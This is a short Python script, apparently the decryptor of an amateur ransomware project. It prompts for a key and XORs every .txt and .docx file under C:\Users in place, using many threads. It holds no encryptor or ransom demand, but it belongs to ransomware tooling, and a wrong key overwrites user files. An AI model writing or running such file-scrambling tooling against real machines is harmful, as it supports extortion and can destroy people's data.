# Ransomeware_dec.py
# 
# Programmer  : sagi.v
# Date        : 9/12/2022
#
#  The code decrypt files with specific
#  Key from the user
#------------------------------------------


# Imports
import os
import random
import datetime
import requests
from threading import Thread
from queue import Queue

# Constants 
DEC_PATH = fr"C:\Users"


def main():

    # Getting the key
    key = input("Insert the key ---> ")
    answer = input("Are you sure its the key? yes/no ")
    if answer != 'yes':
        quit()
    username = os.getenv('username')
    enc_ext = ['.txt','.docx'] # Extensions list for the files, add here the files types you want to decrypt
    files_paths = []
    
    # Inserting all the files in the path into a list
    for root, dirs, files in os.walk(DEC_PATH): # Files in this path will be decrypt 'C:\Users\{username}'
        for file in files:
            file_path, file_ext = os.path.splitext(root + '\\' + file)
            if file_ext in enc_ext:
                files_paths.append(file_path + file_ext)
                
    # Changing the characters in the key
    first_key, second_key = key[:8], key[8:]          
    key = second_key + first_key
    key = key[::-1]

    
    q = Queue()
    for file in files_paths:
        q.put(file)
    for i in range(50):
        thread = Thread(target=decrypt, args=(key, q, ), daemon=True)
        thread.start()
    q.join()
    print("Decryption ended successfully")
    

# Decrypting the files in the queue
def decrypt(key, q):

    # While there is a file in the queue
    while q.not_empty:
        file = q.get()
        index = 0
        max_index = 15
        try:
            with open(file, 'rb') as read_file:
                data = read_file.read()
            with open(file, 'wb') as write_file:
                for byte in data:
                    xor_byte = byte ^ ord(key[index])
                    write_file.write(xor_byte.to_bytes(1, 'little')) # Little endian for windows
                    if index >= max_index:
                        index = 0
                    else:
                        index += 1

        except:
            print(f'Failed to decrypt {file}')
            
        q.task_done()   


if __name__ == "__main__":
    main()
